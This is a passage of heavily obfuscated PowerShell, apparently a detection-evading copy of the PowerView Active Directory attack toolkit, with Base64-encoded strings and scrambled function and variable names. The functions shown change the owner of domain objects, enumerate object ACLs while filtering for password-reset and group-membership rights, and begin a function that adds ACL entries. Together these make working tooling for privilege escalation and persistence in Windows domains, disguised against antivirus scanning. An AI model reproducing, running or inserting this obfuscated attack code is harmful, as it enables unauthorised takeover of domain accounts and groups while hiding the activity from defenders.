                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
        else {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, ${/==\__/\__/\/\_/\}, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
    }
}
function Set-DomainObjectOwner {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/==\/=\/\/==\_} = _____/\/==\/\_/=== @_/\/\/\/\___/\/\/ -Identity $OwnerIdentity -Properties objectsid | select -ExpandProperty objectsid
        if (${_/\/==\/=\/\/==\_}) {
            ${_/\/\/=\/\/\/=\/=} = [System.Security.Principal.SecurityIdentifier]${_/\/==\/=\/\/==\_}
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgAG8AdwBuAGUAcgAgAGkAZABlAG4AdABpAHQAeQAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
        }
    }
    PROCESS {
        if (${_/\/\/=\/\/\/=\/=}) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
            ${/===\/\/\_/==\__/} = _____/\/==\/\_/=== @_/\/\/\/\___/\/\/
            ForEach ($Object in ${/===\/\/\_/==\__/}) {
                try {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHMAZQB0ACAAdABoAGUAIABvAHcAbgBlAHIAIABmAG8AcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwAgAHQAbwAgACcAJABPAHcAbgBlAHIASQBkAGUAbgB0AGkAdAB5ACcA')))
                    ${/=\/\___/=\/=\/==} = ${/===\/\/\_/==\__/}.GetDirectoryEntry()
                    ${/=\/\___/=\/=\/==}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))
                    ${/=\/\___/=\/=\/==}.PsBase.ObjectSecurity.SetOwner(${_/\/\/=\/\/\/=\/=})
                    ${/=\/\___/=\/=\/==}.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AE8AdwBuAGUAcgBdACAARQByAHIAbwByACAAcwBlAHQAdABpAG4AZwAgAG8AdwBuAGUAcgA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function _/==\/===\/=====\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${_/=\_/===\_/\/===\},
        [Switch]
        $ResolveGUIDs,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))
        }
        else {
            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=\/=\/=\__/\___/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
        ${/=====\__/=\/==\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=====\__/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=====\__/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=====\__/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=====\__/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=====\__/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) {
            ${___/\_/=\_____/\_} = __/\/=\/\_/==\_/=\ @/=====\__/=\/==\/
        }
    }
    PROCESS {
        if (${/=\/=\/=\__/\___/}) {
            ${__/\_/==\_/\/\___} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQApAA==')))
                }
                elseif (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0ALgAqAA==')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwAgAGYAcgBvAG0AIAAnACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQAnAA==')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                        ${/=\/=\/=\__/\___/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        if (-not ${/=\/=\/=\__/\___/}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewBfAF8AXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAC8AfQAnAA==')))
                        }
                    }
                }
                elseif (${/\______/===\__/\} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/=\_/=====\__/=\} = (([Guid]${/\______/===\__/\}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                }
                elseif (${/\______/===\__/\}.Contains('.')) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABkAG4AcwBoAG8AcwB0AG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQApAA==')))
                }
                else {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQApAA==')))
                }
            }
            if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            if ($Filter) {
                ${/=\/=\/=\__/\___/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $(${/=\/=\/=\__/\___/}.filter)"
            ${_/\__/\/=====\_/\} = ${/=\/=\/=\__/\___/}.FindAll()
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    ${/===\_/\_/\_/=\__} = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    ${/===\_/\_/\_/=\__} = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))][0], 0 | % { if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | % {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) {
                            ${__/\/=\/==\__/\_/} = Switch ($RightsFilter) {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                                Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA'))) }
                            }
                            if ($_.ObjectType -eq ${__/\/=\/==\__/\_/}) {
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${/===\_/\_/\_/=\__}
                                ${__/=\_/======\/\_} = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${/===\_/\_/\_/=\__}
                            ${__/=\_/======\/\_} = $True
                        }
                        if (${__/=\_/======\/\_}) {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if (${___/\_/=\_____/\_}) {
                                ${_/===\/\_/\/\___/} = @{}
                                $_.psobject.properties | % {
                                    if ($_.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQB8AEkAbgBoAGUAcgBpAHQAZQBkAE8AYgBqAGUAYwB0AFQAeQBwAGUAfABPAGIAagBlAGMAdABBAGMAZQBUAHkAcABlAHwASQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA=')))) {
                                        try {
                                            ${_/===\/\_/\/\___/}[$_.Name] = ${___/\_/=\_____/\_}[$_.Value.toString()]
                                        }
                                        catch {
                                            ${_/===\/\_/\/\___/}[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        ${_/===\/\_/\/\___/}[$_.Name] = $_.Value
                                    }
                                }
                                ${___/==\/======\_/} = New-Object -TypeName PSObject -Property ${_/===\/\_/\/\___/}
                                ${___/==\/======\_/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                ${___/==\/======\_/}
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                }
            }
        }
    }
}
function Add-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${___/===\/==\/=\_/},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
